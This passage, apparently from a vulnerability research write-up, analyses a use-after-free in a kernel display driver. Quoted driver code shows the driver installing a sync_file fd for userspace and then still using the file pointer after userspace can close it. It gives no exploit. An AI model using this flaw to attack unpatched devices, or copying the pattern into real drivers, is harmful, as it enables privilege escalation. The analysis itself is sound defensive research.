 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p><a id="t.79013f3cd36b222e13f8754dff072e9c46a78a1d"></a><a id="t.16"></a><table class="vdnyYxSRCi-c23"><tr class="vdnyYxSRCi-c19"><td class="vdnyYxSRCi-c10" colspan="1" rowspan="1">
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c20">/**</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c20">&nbsp;* struct sync_file - sync file to export to the userspace</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c20">&nbsp;* @file: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; file representing this fence</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c20">&nbsp;* @sync_file_list: &nbsp; &nbsp; membership in global file list</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c20">&nbsp;* @wq: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; wait queue for fence signaling</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c20">&nbsp;* @fence: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;fence with the fences in the sync_file</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c20">&nbsp;* @cb: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; fence callback information</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c20">&nbsp;*/</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c5">struct</span><span class="vdnyYxSRCi-c4">&nbsp;sync_file </span><span class="vdnyYxSRCi-c0">{</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5 vdnyYxSRCi-c9">struct</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">&nbsp;file &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">*</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">file</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c20">/**</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c20">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* @user_name:</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c20">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c20">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* Name of the sync file provided by userspace, for merged fences.</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c20">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* Otherwise generated through driver callbacks (in which case the</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c20">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* entire array is 0).</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c20">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*/</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">char</span><span class="vdnyYxSRCi-c4">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;user_name</span><span class="vdnyYxSRCi-c0">[</span><span class="vdnyYxSRCi-c13">32</span><span class="vdnyYxSRCi-c0">];</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c20">#ifdef</span><span class="vdnyYxSRCi-c3">&nbsp;CONFIG_DEBUG_FS</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">struct</span><span class="vdnyYxSRCi-c4">&nbsp;list_head &nbsp; &nbsp; &nbsp; &nbsp;sync_file_list</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c20">#endif</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; wait_queue_head_t &nbsp; &nbsp; &nbsp; wq</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">unsigned</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c5">long</span><span class="vdnyYxSRCi-c4">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; flags</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">struct</span><span class="vdnyYxSRCi-c4">&nbsp;dma_fence &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="vdnyYxSRCi-c0">*</span><span class="vdnyYxSRCi-c4">fence</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">struct</span><span class="vdnyYxSRCi-c4">&nbsp;dma_fence_cb cb</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c0">};</span></p></td></tr></table>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>The driver then calls </span><span class="vdnyYxSRCi-c2">fd_install</span><span>&nbsp;on the </span><span>fd and file pointer, which makes the fd</span><span>&nbsp;accessible from userspace and transfers ownership of the reference to the fd table. Userspace is able to call </span><span class="vdnyYxSRCi-c2">close</span><span class="vdnyYxSRCi-c7">&nbsp;on that fd. If that fd holds the only reference to the file struct, then the file struct is freed. However, the driver continues to use the pointer to that freed file struct.</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p><a id="t.3acf649b0273fce30d25bdc90665e3e537859c59"></a><a id="t.17"></a><table class="vdnyYxSRCi-c23"><tr class="vdnyYxSRCi-c19"><td class="vdnyYxSRCi-c10" colspan="1" rowspan="1">
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c5">static</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c5">int</span><span class="vdnyYxSRCi-c4">&nbsp;decon_set_win_config</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c5">struct</span><span class="vdnyYxSRCi-c4">&nbsp;decon_device </span><span class="vdnyYxSRCi-c0">*</span><span class="vdnyYxSRCi-c4">decon</span><span class="vdnyYxSRCi-c0">,</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">struct</span><span class="vdnyYxSRCi-c4">&nbsp;decon_win_config_data </span><span class="vdnyYxSRCi-c0">*</span><span class="vdnyYxSRCi-c4">win_data</span><span class="vdnyYxSRCi-c0">)</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c0">{</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">int</span><span class="vdnyYxSRCi-c4">&nbsp;num_of_window </span><span class="vdnyYxSRCi-c0">=</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c13">0</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">struct</span><span class="vdnyYxSRCi-c4">&nbsp;decon_reg_data </span><span class="vdnyYxSRCi-c0">*</span><span class="vdnyYxSRCi-c4">regs</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">struct</span><span class="vdnyYxSRCi-c4">&nbsp;sync_file </span><span class="vdnyYxSRCi-c0">*</span><span class="vdnyYxSRCi-c4">sync_file</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">int</span><span class="vdnyYxSRCi-c4">&nbsp;i</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;j</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;ret </span><span class="vdnyYxSRCi-c0">=</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c13">0</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c0">[...]</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; num_of_window </span><span class="vdnyYxSRCi-c0">=</span><span class="vdnyYxSRCi-c4">&nbsp;decon_get_active_win_count</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">decon</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;win_data</span><span class="vdnyYxSRCi-c0">);</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">if</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">num_of_window</span><span class="vdnyYxSRCi-c0">)</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">{</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">win_data</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">-&gt;</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">retire_fence </span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">=</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">&nbsp;decon_create_fence</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">(</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">decon</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">,</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">&nbsp;</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">&amp;</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">sync_file</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">);</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">if</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">win_data</span><span class="vdnyYxSRCi-c0">-&gt;</span><span class="vdnyYxSRCi-c4">retire_fence </span><span class="vdnyYxSRCi-c0">&lt;</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c13">0</span><span class="vdnyYxSRCi-c0">)</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">goto</span><span class="vdnyYxSRCi-c4">&nbsp;err_prepare</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c0">}</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c5">else</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">{</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c0">[...]</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">if</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">num_of_window</span><span class="vdnyYxSRCi-c0">)</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">{</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">fd_install</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">(</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">win_data</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">-&gt;</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">retire_fence</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">,</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">&nbsp;sync_file</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">-&gt;</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">file</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">);</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">decon_create_release_fences</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">(</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">decon</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">,</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">&nbsp;win_data</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">,</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">&nbsp;sync_file</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">)</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c20">#if !defined(CONFIG_SUPPORT_LEGACY_FENCE)</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; regs</span><span class="vdnyYxSRCi-c0">-&gt;</span><span class="vdnyYxSRCi-c4">retire_fence </span><span class="vdnyYxSRCi-c0">=</span><span class="vdnyYxSRCi-c4">&nbsp;dma_fence_get</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">sync_file</span><span class="vdnyYxSRCi-c0">-&gt;</span><span class="vdnyYxSRCi-c4">fence</span><span class="vdnyYxSRCi-c0">);</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c20">#endif</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c0">}</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c0">[...]</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">return</span><span class="vdnyYxSRCi-c4">&nbsp;ret</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c33">}</span></p></td></tr></table>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>In this case, </span><span class="vdnyYxSRCi-c2">decon_set_win_config</span><span>&nbsp;acquires the </span><span>fd</span><span>&nbsp;for </span><span class="vdnyYxSRCi-c2">retire_fence</span><span>&nbsp;in </span><span class="vdnyYxSRCi-c2">decon_create_fence</span><span class="vdnyYxSRCi-c7">.</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p><a id="t.1cdd8ca32332a13a24b96424b52e329a1e3820d4"></a><a id="t.18"></a><table class="vdnyYxSRCi-c23"><tr class="vdnyYxSRCi-c19"><td class="vdnyYxSRCi-c10" colspan="1" rowspan="1">
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c5">int</span><span class="vdnyYxSRCi-c4">&nbsp;decon_create_fence</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c5">struct</span><span class="vdnyYxSRCi-c4">&nbsp;decon_device </span><span class="vdnyYxSRCi-c0">*</span><span class="vdnyYxSRCi-c4">decon</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c5">struct</span><span class="vdnyYxSRCi-c4">&nbsp;sync_file </span><span class="vdnyYxSRCi-c0">**</span><span class="vdnyYxSRCi-c4">sync_file</span><span class="vdnyYxSRCi-c0">)</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c0">{</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">struct</span><span class="vdnyYxSRCi-c4">&nbsp;dma_fence </span><span class="vdnyYxSRCi-c0">*</span><span class="vdnyYxSRCi-c4">fence</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">int</span><span class="vdnyYxSRCi-c4">&nbsp;fd </span><span class="vdnyYxSRCi-c0">=</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">-</span><span class="vdnyYxSRCi-c4">EMFILE</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; fence </span><span class="vdnyYxSRCi-c0">=</span><span class="vdnyYxSRCi-c4">&nbsp;kzalloc</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c5">sizeof</span><span class="vdnyYxSRCi-c0">(*</span><span class="vdnyYxSRCi-c4">fence</span><span class="vdnyYxSRCi-c0">),</span><span class="vdnyYxSRCi-c4">&nbsp;GFP_KERNEL</span><span class="vdnyYxSRCi-c0">);</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">if</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">(!</span><span class="vdnyYxSRCi-c4">fence</span><span class="vdnyYxSRCi-c0">)</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">return</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">-</span><span class="vdnyYxSRCi-c4">ENOMEM</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; dma_fence_init</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">fence</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">&amp;</span><span class="vdnyYxSRCi-c4">decon_fence_ops</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">&amp;</span><span class="vdnyYxSRCi-c4">decon</span><span class="vdnyYxSRCi-c0">-&gt;</span><span class="vdnyYxSRCi-c4">fence</span><span class="vdnyYxSRCi-c0">.</span><span class="vdnyYxSRCi-c5">lock</span><span class="vdnyYxSRCi-c0">,</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;decon</span><span class="vdnyYxSRCi-c0">-&gt;</span><span class="vdnyYxSRCi-c4">fence</span><span class="vdnyYxSRCi-c0">.</span><span class="vdnyYxSRCi-c4">context</span><span class="vdnyYxSRCi-c0">,</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;atomic_inc_return</span><span class="vdnyYxSRCi-c0">(&amp;</span><span class="vdnyYxSRCi-c4">decon</span><span class="vdnyYxSRCi-c0">-&gt;</span><span class="vdnyYxSRCi-c4">fence</span><span class="vdnyYxSRCi-c0">.</span><span class="vdnyYxSRCi-c4">timeline</span><span class="vdnyYxSRCi-c0">));</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c0">*</span><span class="vdnyYxSRCi-c4">sync_file </span><span class="vdnyYxSRCi-c0">=</span><span class="vdnyYxSRCi-c4">&nbsp;sync_file_create</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">fence</span><span class="vdnyYxSRCi-c0">);</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; dma_fence_put</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">fence</span><span class="vdnyYxSRCi-c0">);</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">if</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">(!(*</span><span class="vdnyYxSRCi-c4">sync_file</span><span class="vdnyYxSRCi-c0">))</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">{</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; decon_err</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c18">&quot;%s: failed to create sync file\n&quot;</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;__func__</span><span class="vdnyYxSRCi-c0">);</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">return</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">-</span><span class="vdnyYxSRCi-c4">ENOMEM</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c0">}</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">fd </span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">=</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">&nbsp;decon_get_valid_fd</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">();</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">if</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">fd </span><span class="vdnyYxSRCi-c0">&lt;</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c13">0</span><span class="vdnyYxSRCi-c0">)</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">{</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; decon_err</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c18">&quot;%s: failed to get unused fd\n&quot;</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;__func__</span><span class="vdnyYxSRCi-c0">);</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; fput</span><span class="vdnyYxSRCi-c0">((*</span><span class="vdnyYxSRCi-c4">sync_file</span><span class="vdnyYxSRCi-c0">)-&gt;</span><span class="vdnyYxSRCi-c4">file</span><span class="vdnyYxSRCi-c0">);</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c0">}</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">return</span><span class="vdnyYxSRCi-c4">&nbsp;fd</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c0">}</span></p></td></tr></table>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
